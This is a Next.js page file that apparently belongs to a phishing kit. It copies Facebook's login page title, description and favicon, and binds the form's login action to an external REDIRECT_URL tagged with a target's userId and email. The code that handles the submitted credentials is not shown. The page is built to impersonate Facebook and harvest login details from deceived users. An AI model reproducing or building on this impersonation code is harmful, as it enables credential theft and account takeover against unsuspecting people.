import { login } from "@/actions";
import Component from "@/components/facebook-landing";
import { env } from "@/env.mjs";
import type { Metadata } from "next";
import { notFound } from "next/navigation";
import { z } from "zod";

interface PageProps {
  searchParams: {
    [key: string]: string | string[] | undefined;
  };
}

export const metadata: Metadata = {
  title: "Facebook - log in or sign up",
  description:
    "Log into Facebook to start sharing and connecting with your friends, family, and people you know.",
  icons: {
    icon: "https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico",
    apple: "https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico",
  },
};

const searchParamsSchema = z.object({
  userId: z.string().min(1),
  url: z.string().email(),
});

export default function Page({ searchParams }: PageProps) {
  const parsed = searchParamsSchema.safeParse(searchParams);
  if (!parsed.success) notFound();
  const { userId, url } = parsed.data;
  const baseUrl = `${env.REDIRECT_URL}?url=${url}&userid=${userId}`;
  return <Component action={login.bind(null, baseUrl)} />;
}
